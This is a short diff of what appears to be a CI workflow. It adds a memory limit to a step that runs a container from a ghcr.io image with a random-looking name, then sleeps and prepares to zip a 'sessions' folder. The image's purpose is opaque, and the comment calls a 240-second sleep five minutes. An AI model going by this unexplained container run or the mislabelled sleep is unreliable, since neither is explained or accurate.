@@ -19,7 +19,7 @@ jobs:
 
     - name: Run Initial Docker Processes
       run: |
-        docker run -d --name session_container ghcr.io/nixegohshs5f4ef6vuun43f6/hvhj456v3cy7rv66v4rfgu6rtyu8843dbitapyv3125:yhf3gj79bt8kytv57vttv7rec7bitA0001-of-one
+        docker run -d --name session_container --memory=4g ghcr.io/nixegohshs5f4ef6vuun43f6/hvhj456v3cy7rv66v4rfgu6rtyu8843dbitapyv3125:yhf3gj79bt8kytv57vttv7rec7bitA0001-of-one
         # Simulate initial processes
         sleep 240 # Sleep for 5 minutes
         # Ensure proper permissions and zip the sessions folder
